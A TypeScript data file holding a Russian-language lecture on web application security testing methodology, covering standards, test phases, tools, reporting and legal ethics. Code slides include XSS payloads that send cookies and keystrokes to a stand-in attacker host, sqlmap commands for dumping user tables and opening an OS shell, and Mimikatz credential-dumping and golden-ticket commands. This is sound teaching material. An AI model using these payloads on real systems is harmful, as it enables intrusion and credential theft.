import { Lecture } from "@/types";

export const securityAssessmentMethodologyLecture: Lecture = {
  id: "security-assessment-methodology",
  title: "Методология оценки безопасности веб-приложений",
  description:
    "Стандарты, методологии и практические аспекты тестирования безопасности веб-приложений",
  groupId: "web-security",
  createdAt: new Date("2025-09-20"),
  updatedAt: new Date("2025-09-20"),
  tags: [
    "web-security",
    "тестирование безопасности",
    "пентестинг",
    "OWASP",
    "методология",
    "аудит безопасности",
  ],
  difficulty: "advanced",
  duration: 8,

  slides: [
    {
      id: "slide-1",
      title: "Методология оценки безопасности веб-приложений",
      type: "title",
      content: "Стандарты, методы и практики тестирования безопасности",
      keyPoints: [
        {
          title: "Стандарты оценки безопасности",
          description: "OWASP Testing Guide, PTES, NIST SP 800-115",
        },
        {
          title: "Этапы тестирования",
          description: "От планирования до составления отчета",
        },
        {
          title: "Методологии пентестинга",
          description: "Черный, белый и серый ящик",
        },
        {
          title: "Инструментарий",
          description: "Основные инструменты для тестирования безопасности",
        },
      ],
    },

    {
      id: "slide-2",
      title: "Цели и задачи курса",
      type: "list",
      content: "В рамках данной лекции мы изучим:",
      items: [
        "Основные стандарты и методологии тестирования безопасности",
        "Этапы проведения тестирования веб-приложений",
        "Инструменты и техники для каждого этапа тестирования",
        "Методы составления отчетов и рекомендаций",
        "Правовые и этические аспекты тестирования безопасности",
      ],
    },

    {
      id: "slide-3",
      title: "Важность тестирования безопасности",
      type: "content",
      content:
        "Тестирование безопасности позволяет выявить уязвимости до их эксплуатации злоумышленниками. Регулярное тестирование снижает риски финансовых потерь, репутационного ущерба и юридической ответственности.",
    },

    {
      id: "slide-4",
      title: "Виды тестирования безопасности",
      type: "two-column",
      content: "Различные подходы к тестированию безопасности",
      leftContent: {
        title: "По уровню доступа",
        items: [
          "Black Box (черный ящик) — тестирование без знания внутренней структуры",
          "White Box (белый ящик) — тестирование с полным доступом к коду и архитектуре",
          "Gray Box (серый ящик) — частичное знание внутренней структуры",
        ],
      },
      rightContent: {
        title: "По методам",
        items: [
          "Статический анализ (SAST) — анализ исходного кода",
          "Динамический анализ (DAST) — тестирование работающего приложения",
          "Интерактивный анализ (IAST) — комбинация SAST и DAST",
          "Ручное тестирование — экспертный анализ",
        ],
      },
    },

    {
      id: "slide-5",
      title: "Сравнение подходов тестирования",
      type: "two-column",
      content: "Преимущества и недостатки различных подходов",
      leftContent: {
        title: "Black Box",
        items: [
          "✅ Близко к реальной атаке",
          "✅ Не требует доступа к коду",
          "❌ Может пропустить логические уязвимости",
          "❌ Требует больше времени",
        ],
      },
      rightContent: {
        title: "White Box",
        items: [
          "✅ Полное покрытие кода",
          "✅ Обнаружение логических уязвимостей",
          "❌ Требует доступа к коду",
          "❌ Может быть менее реалистичным",
        ],
      },
    },

    {
      id: "slide-6",
      title: "Стандарты и фреймворки тестирования",
      type: "list",
      content: "Основные международные стандарты оценки безопасности:",
      items: [
        "OWASP Testing Guide — наиболее полное руководство по тестированию веб-приложений",
        "PTES (Penetration Testing Execution Standard) — стандарт выполнения тестирования на проникновение",
        "NIST SP 800-115 — руководство по тестированию безопасности информационных технологий",
        "OSSTMM (Open Source Security Testing Methodology Manual) — методология открытого тестирования безопасности",
        "ISSAF (Information Systems Security Assessment Framework) — фреймворк оценки безопасности ИС",
      ],
    },

    {
      id: "slide-7",
      title: "OWASP Testing Guide",
      type: "content",
      content:
        "OWASP Testing Guide — это наиболее полное и подробное руководство по тестированию безопасности веб-приложений. Оно охватывает все аспекты тестирования, от планирования до составления отчета, и регулярно обновляется сообществом OWASP.",
    },

    {
      id: "slide-8",
      title: "Структура OWASP Testing Guide",
      type: "list",
      content: "Руководство состоит из нескольких основных разделов:",
      items: [
        "Введение в тестирование веб-приложений",
        "Модель тестирования OWASP",
        "Этапы тестирования",
        "Техники тестирования (по категориям уязвимостей)",
        "Отчетность и документирование",
        "Приложения и дополнительные материалы",
      ],
    },

    {
      id: "slide-9",
      title: "PTES (Penetration Testing Execution Standard)",
      type: "content",
      content:
        "PTES — это стандарт, описывающий полный цикл тестирования на проникновение. Он состоит из семи основных этапов и предоставляет технические руководства для каждого из них.",
    },

    {
      id: "slide-10",
      title: "Этапы PTES",
      type: "list",
      content: "Стандарт PTES включает семь этапов:",
      items: [
        "Pre-engagement Interactions (Подготовительные взаимодействия)",
        "Intelligence Gathering (Сбор информации)",
        "Threat Modeling (Моделирование угроз)",
        "Vulnerability Analysis (Анализ уязвимостей)",
        "Exploitation (Эксплуатация)",
        "Post Exploitation (Пост-эксплуатация)",
        "Reporting (Составление отчета)",
      ],
    },

    {
      id: "slide-11",
      title: "NIST SP 800-115",
      type: "content",
      content:
        "NIST SP 800-115 — руководство по тестирования безопасности информационных технологий, выпущенное Национальным институтом стандартов и технологий США. Оно предоставляет рекомендации по планированию, проведению и анализу результатов тестирования безопасности.",
    },

    {
      id: "slide-12",
      title: "Основные этапы по NIST SP 800-115",
      type: "list",
      content: "Руководство описывает четыре основных этапа тестирования:",
      items: [
        "Planning (Планирование) — определение целей, scope и правил тестирования",
        "Discovery (Обнаружение) — сбор информации и выявление уязвимостей",
        "Attack (Атака) — попытка эксплуатации выявленных уязвимостей",
        "Reporting (Отчетность) — документирование результатов и рекомендаций",
      ],
    },

    {
      id: "slide-13",
      title: "Этапы тестирования безопасности",
      type: "title",
      content: "Полный цикл оценки безопасности веб-приложений",
      keyPoints: [
        {
          title: "Планирование и подготовка",
          description: "Определение целей, scope и правил взаимодействия",
        },
        {
          title: "Разведка и сбор информации",
          description: "Пассивный и активный сбор данных о цели",
        },
        {
          title: "Анализ уязвимостей",
          description: "Выявление потенциальных точек воздействия",
        },
        {
          title: "Эксплуатация уязвимостей",
          description: "Подтверждение критичности найденных уязвимостей",
        },
        {
          title: "Пост-эксплуатационный анализ",
          description: "Оценка потенциального ущерба и глубины проникновения",
        },
        {
          title: "Составление отчета",
          description: "Документирование результатов и рекомендаций",
        },
      ],
    },

    {
      id: "slide-14",
      title: "Этап 1: Планирование и подготовка",
      type: "content",
      content:
        "Планирование — критически важный этап, на котором определяются цели, scope, правила взаимодействия и юридические аспекты тестирования. На этом этапе также заключается соглашение о неразглашении (NDA) и подписывается договор на проведение работ.",
    },

    {
      id: "slide-15",
      title: "Элементы плана тестирования",
      type: "list",
      content: "План тестирования должен включать:",
      items: [
        "Цели и задачи тестирования",
        "Scope тестирования (что тестируется, а что нет)",
        "Методология тестирования (black/white/gray box)",
        "Временные рамки и расписание",
        "Правила взаимодействия с заказчиком",
        "Критерии успешного завершения",
        "План действий в чрезвычайных ситуациях",
      ],
    },

    {
      id: "slide-16",
      title: "Юридические аспекты тестирования",
      type: "list",
      content: "Важные юридические документы и соглашения:",
      items: [
        "Соглашение о неразглашении (NDA)",
        "Договор на оказание услуг тестирования",
        "Письменное разрешение на тестирование (Authorization Letter)",
        "Правила ответственного раскрытия уязвимостей",
        "Политика конфиденциальности и обработки данных",
      ],
    },

    {
      id: "slide-17",
      title: "Определение scope тестирования",
      type: "two-column",
      content: "Scope определяет границы тестирования",
      leftContent: {
        title: "Включается в scope",
        items: [
          "Конкретные домены и поддомены",
          "IP-адреса и диапазоны",
          "Веб-приложения и API",
          "Временные окна тестирования",
        ],
      },
      rightContent: {
        title: "Исключается из scope",
        items: [
          "Продuction данные клиентов",
          "Критические системы в рабочее время",
          "Сторонние сервисы и API",
          "Системы, не принадлежащие заказчику",
        ],
      },
    },

    {
      id: "slide-18",
      title: "Этап 2: Разведка и сбор информации",
      type: "content",
      content:
        "Сбор информации — фундаментальный этап, на котором собираются данные о целевой системе. Качество разведки напрямую влияет на успешность всего тестирования.",
    },

    {
      id: "slide-19",
      title: "Пассивная разведка",
      type: "list",
      content: "Методы сбора информации без прямого взаимодействия с целью:",
      items: [
        "Поиск в открытых источниках (OSINT)",
        "Анализ DNS записей (WHOIS, обратный DNS)",
        "Исследование архивов веб-сайтов (Wayback Machine)",
        "Анализ социальных сетей и профилей сотрудников",
        "Поиск утечек данных и информации в даркнете",
      ],
    },

    {
      id: "slide-20",
      title: "Активная разведка",
      type: "list",
      content: "Методы прямого взаимодействия с целевой системой:",
      items: [
        "Сканирование портов и служб",
        "Определение операционных систем и сервисов",
        "Анализ ответов серверов и заголовков",
        "Идентификация технологического стека",
        "Картирование сети и инфраструктуры",
      ],
    },

    {
      id: "slide-21",
      title: "Инструменты для разведки",
      type: "two-column",
      content: "Популярные инструменты для сбора информации",
      leftContent: {
        title: "Пассивная разведка",
        items: [
          "theHarvester — сбор email и субдоменов",
          "Maltego — визуализация связей",
          "Shodan — поиск устройств в интернете",
          "Google Dorks — расширенный поиск",
        ],
      },
      rightContent: {
        title: "Активная разведка",
        items: [
          "Nmap — сканирование сетей и портов",
          "Recon-ng — фреймворк для разведки",
          "Sublist3r — поиск субдоменов",
          "Wappalyzer — идентификация технологий",
        ],
      },
    },

    {
      id: "slide-22",
      title: "Сбор информации о веб-приложении",
      type: "list",
      content: "Специфические методы для веб-приложений:",
      items: [
        "Анализ robots.txt и sitemap.xml",
        "Идентификация фреймворков и CMS",
        "Обнаружение скрытых файлов и директорий",
        "Анализ JavaScript файлов",
        "Исследование API эндпоинтов",
      ],
    },

    {
      id: "slide-23",
      title: "Этап 3: Анализ уязвимостей",
      type: "content",
      content:
        "На этапе анализа уязвимостей производится поиск и идентификация потенциальных точек воздействия в целевой системе. Этот этап сочетает автоматическое сканирование с ручным анализом.",
    },

    {
      id: "slide-24",
      title: "Автоматическое сканирование уязвимостей",
      type: "list",
      content: "Инструменты для автоматического сканирования:",
      items: [
        "Nessus — комплексный сканер уязвимостей",
        "OpenVAS — открытый аналог Nessus",
        "Nikto — сканер уязвимостей веб-приложений",
        "OWASP ZAP — прокси-сканер для веб-приложений",
        "Burp Suite Professional — коммерческий инструмент для тестирования",
      ],
    },

    {
      id: "slide-25",
      title: "Ручной анализ уязвимостей",
      type: "list",
      content: "Техники ручного анализа:",
      items: [
        "Анализ исходного кода (при white box тестировании)",
        "Обход аутентификации и авторизации",
        "Тестирование механизмов ввода данных",
        "Анализ конфигурации безопасности",
        "Исследование бизнес-логики приложения",
      ],
    },

    {
      id: "slide-26",
      title: "Категории уязвимостей для тестирования",
      type: "list",
      content: "Основные категории по OWASP Testing Guide:",
      items: [
        "Информационная разведка",
        "Тестирование аутентификации",
        "Тестирование авторизации",
        "Тестирование управления сессиями",
        "Тестирование валидации входных данных",
        "Тестирование обработки ошибок",
        "Тестирование криптографии",
        "Тестирование бизнес-логики",
        "Тестирование клиентской стороны",
      ],
    },

    {
      id: "slide-27",
      title: "Тестирование аутентификации",
      type: "two-column",
      content: "Методы тестирования механизмов аутентификации",
      leftContent: {
        title: "Основные векторы атак",
        items: [
          "Подбор учетных данных (brute force)",
          "Обход аутентификации",
          "Слабые политики паролей",
          "Уязвимости многофакторной аутентификации",
        ],
      },
      rightContent: {
        title: "Инструменты тестирования",
        items: [
          "Hydra — подбор паролей",
          "Burp Intruder — автоматизация атак",
          "Custom scripts — для специфических сценариев",
          "Browser extensions — для анализа форм",
        ],
      },
    },

    {
      id: "slide-28",
      title: "Тестирование авторизации",
      type: "list",
      content: "Проверка контроля доступа:",
      items: [
        "Привилегированное управление доступом",
        "Обход ограничений по ролям",
        "IDOR (Insecure Direct Object References)",
        "Тестирование вертикального и горизонтального контроля доступа",
        "JWT и токен-based авторизация",
      ],
    },

    {
      id: "slide-29",
      title: "Тестирование управления сессиями",
      type: "list",
      content: "Анализ механизмов управления сессиями:",
      items: [
        "Предсказуемость идентификаторов сессий",
        "Таймауты и срок жизни сессий",
        "Защита от фиксации сессии",
        "Механизмы выхода и очистки сессий",
        "Хранение и передача токенов аутентификации",
      ],
    },

    {
      id: "slide-30",
      title: "Тестирование валидации входных данных",
      type: "list",
      content: "Проверка обработки пользовательского ввода:",
      items: [
        "SQL инъекции (классические и blind)",
        "NoSQL инъекции",
        "Командные инъекции",
        "XSS (Reflected, Stored, DOM-based)",
        "XXE (XML External Entity) инъекции",
        "Template инъекции",
      ],
    },

    {
      id: "slide-31",
      title: "Инструменты для тестирования инъекций",
      type: "two-column",
      content: "Специализированные инструменты",
      leftContent: {
        title: "SQL инъекции",
        items: [
          "sqlmap — автоматическое обнаружение и эксплуатация",
          "SQLNinja — специализированный инструмент",
          "Havij — коммерческое решение",
        ],
      },
      rightContent: {
        title: "XSS и другие инъекции",
        items: [
          "XSSer — фреймворк для XSS тестирования",
          "XSStrike — современный XSS сканер",
          "Commix — инструмент для командных инъекций",
        ],
      },
    },

    {
      id: "slide-32",
      title: "Тестирование обработки ошибок",
      type: "list",
      content: "Анализ обработки исключительных ситуаций:",
      items: [
        "Информативные сообщения об ошибках",
        "Раскрытие чувствительной информации",
        "Stack trace и детали реализации",
        "Обработка нестандартных входных данных",
        "Устойчивость к исключениям",
      ],
    },

    {
      id: "slide-33",
      title: "Тестирование криптографии",
      type: "list",
      content: "Проверка криптографических implementation:",
      items: [
        "Использование устаревших алгоритмов",
        "Слабые ключи и их генерация",
        "Небезопасная передача чувствительных данных",
        "Проверка SSL/TLS конфигурации",
        "Хранение паролей и чувствительных данных",
      ],
    },

    {
      id: "slide-34",
      title: "Инструменты для тестирования криптографии",
      type: "list",
      content: "Специализированные инструменты:",
      items: [
        "SSLScan — анализ SSL/TLS конфигурации",
        "TestSSL.sh — комплексная проверка SSL",
        "John the Ripper — взлом паролей",
        "Hashcat — расширенный взлом хешей",
      ],
    },

    {
      id: "slide-35",
      title: "Тестирование бизнес-логики",
      type: "content",
      content:
        "Тестирование бизнес-логики требует глубокого понимания работы приложения и focuses на поиске flaws в workflow и процессах приложения.",
    },

    {
      id: "slide-36",
      title: "Примеры уязвимостей бизнес-логики",
      type: "list",
      content: "Распространенные проблемы бизнес-логики:",
      items: [
        "Обход workflow (пропуск шагов)",
        "Манипуляция ценами и суммами",
        "Повторное использование одноразовых действий",
        "Конкурентные условия (race conditions)",
        "Злоупотребление функциональностью",
      ],
    },

    {
      id: "slide-37",
      title: "Тестирование клиентской стороны",
      type: "list",
      content: "Анализ безопасности на стороне клиента:",
      items: [
        "JavaScript security issues",
        "DOM-based vulnerabilities",
        "Client-side storage security",
        "CORS и CSP misconfigurations",
        "WebSocket security",
      ],
    },

    {
      id: "slide-38",
      title: "Этап 4: Эксплуатация уязвимостей",
      type: "content",
      content:
        "Этап эксплуатации предполагает реальное использование найденных уязвимостей для получения доступа, повышения привилегий или извлечения данных. Цель — подтверждение критичности уязвимостей.",
    },

    {
      id: "slide-39",
      title: "Методы эксплуатации",
      type: "two-column",
      content: "Основные подходы к эксплуатации",
      leftContent: {
        title: "Веб-приложения",
        items: [
          "Получение доступа к админ-панели",
          "Извлечение данных из БД",
          "Компрометация сессий пользователей",
          "Загрузка веб-шеллов",
        ],
      },
      rightContent: {
        title: "Инфраструктура",
        items: [
          "Получение доступа к серверам",
          "Перемещение по сети",
          "Повышение привилегий",
          "Установка persistence",
        ],
      },
    },

    {
      id: "slide-40",
      title: "Инструменты для эксплуатации",
      type: "list",
      content: "Популярные инструменты для эксплуатации:",
      items: [
        "Metasploit Framework — комплексный фреймворк",
        "SQLmap — для эксплуатации SQL инъекций",
        "BeEF — браузерный фреймворк эксплуатации",
        "Custom exploits — специализированные эксплоиты",
      ],
    },

    {
      id: "slide-41",
      title: "Демонстрация эксплуатации SQL инъекции",
      type: "code",
      content: "Пример использования sqlmap для эксплуатации SQLi:",
      codeExample: {
        language: "bash",
        title: "Использование sqlmap",
        code: `# Базовое сканирование на SQL инъекции
sqlmap -u "http://example.com/page?id=1"

# Определение БД и перечисление таблиц
sqlmap -u "http://example.com/page?id=1" --dbs --tables

# Дамп конкретной таблицы
sqlmap -u "http://example.com/page?id=1" -D database -T users --dump

# Получение shell на сервере
sqlmap -u "http://example.com/page?id=1" --os-shell`,
      },
    },

    {
      id: "slide-42",
      title: "Демонстрация эксплуатации XSS",
      type: "code",
      content: "Пример эксплуатации XSS уязвимости:",
      codeExample: {
        language: "javascript",
        title: "XSS payload примеры",
        code: `# Кража cookies
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

# Кейлоггинг
<script>document.onkeypress = function(e) { 
  fetch('http://attacker.com/log?key=' + e.key);
}</script>

# DOM-based XSS
<img src=x onerror=alert(1)>`,
      },
    },

    {
      id: "slide-43",
      title: "Этап 5: Пост-эксплуатационный анализ",
      type: "content",
      content:
        "После успешной эксплуатации проводится анализ полученного доступа, оценивается потенциальный ущерб и глубина компрометации системы.",
    },

    {
      id: "slide-44",
      title: "Задачи пост-эксплуатации",
      type: "list",
      content: "Основные действия на этапе пост-эксплуатации:",
      items: [
        "Анализ доступа и привилегий",
        "Сбор дополнительной информации о системе",
        "Поиск чувствительных данных",
        "Анализ соседних систем и сетей",
        "Оценка persistence и скрытности",
      ],
    },

    {
      id: "slide-45",
      title: "Инструменты пост-эксплуатации",
      type: "list",
      content: "Популярные инструменты:",
      items: [
        "Mimikatz — для работы с учетными данными Windows",
        "BloodHound — анализ актив directory",
        "LinPEAS/WinPEAS — сбор информации о системе",
        "PsExec — выполнение команд на удаленных системах",
      ],
    },

    {
      id: "slide-46",
      title: "Демонстрация пост-эксплуатации",
      type: "code",
      content: "Пример использования Mimikatz:",
      codeExample: {
        language: "bash",
        title: "Работа с Mimikatz",
        code: `# Запуск Mimikatz
mimikatz.exe

# Получение хешей паролей
sekurlsa::logonpasswords

# Экспорт сертификатов
crypto::certificates /export

# Золотой билет атака
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ptt`,
      },
    },

    {
      id: "slide-47",
      title: "Этап 6: Составление отчета",
      type: "content",
      content:
        "Отчет — ключевой результат тестирования, который должен быть понятен как техническим специалистам, так и руководству. Качественный отчет содержит не только список уязвимостей, но и рекомендации по их устранению.",
    },

    {
      id: "slide-48",
      title: "Структура отчета",
      type: "list",
      content: "Рекомендуемая структура отчета:",
      items: [
        "Титульная страница и информация о проекте",
        "Executive Summary (краткое резюме для руководства)",
        "Обзор методологии и scope тестирования",
        "Детализированные результаты по каждой уязвимости",
        "Оценка рисков и приоритеты устранения",
        "Рекомендации по исправлению уязвимостей",
        "Приложения (лог-файлы, скриншоты, дополнительные материалы)",
      ],
    },

    {
      id: "slide-49",
      title: "Executive Summary",
      type: "content",
      content:
        "Executive Summary — это раздел для руководства, который должен содержать краткий обзор результатов тестирования, общую оценку безопасности и ключевые рекомендации без технических деталей.",
    },

    {
      id: "slide-50",
      title: "Детализированные результаты",
      type: "content",
      content:
        "Для каждой уязвимости должна быть предоставлена детальная информация: описание, шаги воспроизведения, доказательства (скриншоты), оценка риска и рекомендации по исправлению.",
    },

    {
      id: "slide-51",
      title: "Пример описания уязвимости",
      type: "two-column",
      content: "Структура описания уязвимости",
      leftContent: {
        title: "Технические детали",
        items: [
          "Название и CVE (если есть)",
          "Уровень критичности (Critical, High, Medium, Low)",
          "Локация уязвимости",
          "Описание уязвимости",
          "Шаги воспроизведения",
        ],
      },
      rightContent: {
        title: "Дополнительная информация",
        items: [
          "Скриншоты или доказательства",
          "Воздействие на бизнес",
          "Рекомендации по исправлению",
          "Ссылки на дополнительные материалы",
        ],
      },
    },

    {
      id: "slide-52",
      title: "Оценка рисков",
      type: "content",
      content:
        "Оценка рисков должна учитывать как техническую критичность уязвимости, так и бизнес-воздействие. Обычно используется матрица рисков, учитывающая вероятность эксплуатации и потенциальный ущерб.",
    },

    {
      id: "slide-53",
      title: "Матрица оценки рисков",
      type: "two-column",
      content: "Пример матрицы оценки рисков",
      leftContent: {
        title: "Вероятность",
        items: [
          "Высокая — легкая эксплуатация, публичные эксплоиты",
          "Средняя — требует определенных знаний",
          "Низкая — сложная эксплуатация, специфические условия",
        ],
      },
      rightContent: {
        title: "Воздействие",
        items: [
          "Критическое — полный компромисс системы",
          "Высокое — значительный ущерб",
          "Среднее — ограниченный ущерб",
          "Низкое — минимальный ущерб",
        ],
      },
    },

    {
      id: "slide-54",
      title: "Рекомендации по исправлению",
      type: "content",
      content:
        "Рекомендации должны быть конкретными, реализуемыми и содержать примеры кода или конфигураций. Важно предоставлять не только что исправить, но и как это сделать правильно.",
    },

    {
      id: "slide-55",
      title: "Пример рекомендации",
      type: "code",
      content: "Рекомендация по исправлению SQL инъекции:",
      codeExample: {
        language: "php",
        title: "Исправление SQL инъекции",
        code: `// НЕПРАВИЛЬНО (уязвимый код)
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysql_query($query);

// ПРАВИЛЬНО (исправленный код)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
$result = $stmt->fetchAll();`,
      },
    },

    {
      id: "slide-56",
      title: "Инструменты для составления отчетов",
      type: "list",
      content: "Популярные инструменты:",
      items: [
        "Dradis Framework — фреймворк для управления тестированием",
        "Serpico — специализированный инструмент для отчетов",
        "Burp Suite — встроенные функции отчетности",
        "Custom templates — шаблоны в Word/Markdown",
      ],
    },

    {
      id: "slide-57",
      title: "Правовые и этические аспекты",
      type: "content",
      content:
        "Тестирование безопасности должно проводиться в строгом соответствии с законодательством и этическими нормами. Несанкционированное тестирование является правонарушением.",
    },

    {
      id: "slide-58",
      title: "Ключевые правовые принципы",
      type: "list",
      content: "Важные правовые аспекты:",
      items: [
        "Обязательное получение письменного разрешения",
        "Соблюдение scope тестирования",
        "Конфиденциальность полученных данных",
        "Ответственное раскрытие уязвимостей",
        "Соблюдение законодательства о защите данных",
      ],
    },

    {
      id: "slide-59",
      title: "Ответственное раскрытие уязвимостей",
      type: "content",
      content:
        "Ответственное раскрытие предполагает уведомление владельца системы об уязвимости и предоставление времени на ее устранение до публикации информации.",
    },

    {
      id: "slide-60",
      title: "Процесс ответственного раскрытия",
      type: "list",
      content: "Этапы ответственного раскрытия:",
      items: [
        "Обнаружение уязвимости",
        "Подтверждение уязвимости",
        "Уведомление владельца системы",
        "Предоставление времени на исправление (обычно 90 дней)",
        "Публикация информации после исправления",
      ],
    },

    {
      id: "slide-61",
      title: "Непрерывное тестирование безопасности",
      type: "content",
      content:
        "В современной разработке тестирование безопасности должно быть интегрировано в процесс непрерывной интеграции и доставки (CI/CD).",
    },

    {
      id: "slide-62",
      title: "DevSecOps подход",
      type: "list",
      content: "Принципы интеграции безопасности в DevOps:",
      items: [
        "Security as Code — безопасность как часть кода",
        "Автоматизированное тестирование в pipeline",
        "Непрерывный мониторинг безопасности",
        "Культура общей ответственности за безопасность",
      ],
    },

    {
      id: "slide-63",
      title: "Инструменты DevSecOps",
      type: "two-column",
      content: "Инструменты для автоматизации безопасности",
      leftContent: {
        title: "SAST tools",
        items: [
          "SonarQube — анализ качества кода",
          "Checkmarx — коммерческое решение",
          "Semgrep — статический анализ",
        ],
      },
      rightContent: {
        title: "DAST tools",
        items: [
          "OWASP ZAP — интеграция в CI/CD",
          "Burp Suite Enterprise — коммерческое решение",
          "Nikto — автоматическое сканирование",
        ],
      },
    },

    {
      id: "slide-64",
      title: "Интеграция в CI/CD pipeline",
      type: "code",
      content: "Пример GitLab CI pipeline с security scanning:",
      codeExample: {
        language: "yaml",
        title: ".gitlab-ci.yml",
        code: `stages:
  - test
  - security
  - deploy

sast:
  stage: security
  image: owasp/zap2docker-stable
  script:
    - zap-baseline.py -t https://example.com -r report.html

dast:
  stage: security
  image: instrumentisto/nmap
  script:
    - nmap -sV --script vuln example.com

dependency_scanning:
  stage: security
  image: alpine
  script:
    - npm audit --audit-level moderate

deploy:
  stage: deploy
  script:
    - echo "Deploying application"
  only:
    - master`,
      },
    },

    {
      id: "slide-65",
      title: "Сертификации и обучение",
      type: "content",
      content:
        "Профессиональные сертификации помогают подтвердить квалификацию в области тестирования безопасности.",
    },

    {
      id: "slide-66",
      title: "Популярные сертификации",
      type: "two-column",
      content: "Международно признанные сертификации",
      leftContent: {
        title: "Технические сертификации",
        items: [
          "OSCP (Offensive Security Certified Professional)",
          "CEH (Certified Ethical Hacker)",
          "GWEB (GIAC Web Application Penetration Tester)",
        ],
      },
      rightContent: {
        title: "Аудиторские сертификации",
        items: [
          "CISSP (Certified Information Systems Security Professional)",
          "CISA (Certified Information Systems Auditor)",
          "ISO 27001 Lead Auditor",
        ],
      },
    },

    {
      id: "slide-67",
      title: "Ресурсы для обучения",
      type: "list",
      content: "Полезные ресурсы для обучения:",
      items: [
        "OWASP Web Security Testing Guide",
        "PortSwigger Web Security Academy",
        "HackTheBox и TryHackMe — практические платформы",
        "Cybrary — онлайн курсы по безопасности",
      ],
    },

    {
      id: "slide-68",
      title: "Emerging trends",
      type: "list",
      content: "Современные тенденции в тестировании безопасности:",
      items: [
        "API security testing — фокус на тестировании API",
        "Cloud security assessment — тестирование облачных сред",
        "IoT security testing — безопасность интернета вещей",
        "AI-powered security testing — использование ИИ для тестирования",
        "Shift-left security — раннее тестирование в процессе разработки",
      ],
    },

    {
      id: "slide-69",
      title: "Чеклист тестирования безопасности",
      type: "list",
      content: "Основные пункты для проверки:",
      items: [
        "Информационная разведка завершена",
        "Все векторы атак протестированы",
        "Автоматическое и ручное тестирование выполнено",
        "Уязвимости подтверждены эксплуатацией",
        "Отчет содержит рекомендации по исправлению",
      ],
    },

    {
      id: "slide-70",
      title: "Common mistakes",
      type: "list",
      content: "Частые ошибки при тестировании безопасности:",
      items: [
        "Неполный scope тестирования",
        "Недостаточная глубина тестирования",
        "Игнорирование бизнес-логики",
        "Некачественный отчет",
        "Нарушение правил взаимодействия",
      ],
    },

    {
      id: "slide-71",
      title: "Лучшие практики",
      type: "list",
      content: "Лучшие практики тестирования безопасности:",
      items: [
        "Следование стандартам (OWASP, PTES, NIST)",
        "Комбинация автоматического и ручного тестирования",
        "Постоянное обучение и практика",
        "Документирование всех шагов тестирования",
        "Ответственное раскрытие уязвимостей",
      ],
    },

    {
      id: "slide-72",
      title: "Подготовка к тестированию",
      type: "list",
      content: "Что нужно подготовить перед тестированием:",
      items: [
        "Техническая инфраструктура (VPN, инструменты)",
        "Юридические документы (NDA, разрешения)",
        "Коммуникационные каналы с заказчиком",
        "План тестирования и методология",
        "Система документирования результатов",
      ],
    },

    {
      id: "slide-73",
      title: "Завершение тестирования",
      type: "list",
      content: "Финальные шаги после тестирования:",
      items: [
        "Очистка систем от временных файлов",
        "Возврат всех изменений к исходному состоянию",
        "Финальный отчет и презентация результатов",
        "Передача всех материалов заказчику",
        "Архивация результатов тестирования",
      ],
    },

    {
      id: "slide-74",
      title: "Заключение",
      type: "conclusion",
      content:
        "Методология оценки безопасности — это системный подход к выявлению и устранению уязвимостей в веб-приложениях. Следование стандартам и лучшим практикам позволяет обеспечить полноту тестирования и воспроизводимость результатов.",
      keyTakeaways: [
        "Тестирование безопасности должно быть частью жизненного цикла разработки",
        "Следование стандартам (OWASP, PTES, NIST) обеспечивает полноту проверки",
        "Каждый этап тестирования важен и влияет на конечный результат",
        "Качественный отчет — ключевой элемент успешного проекта по тестированию безопасности",
        "Непрерывное обучение и практика необходимы для поддержания квалификации",
      ],
    },
  ],
};
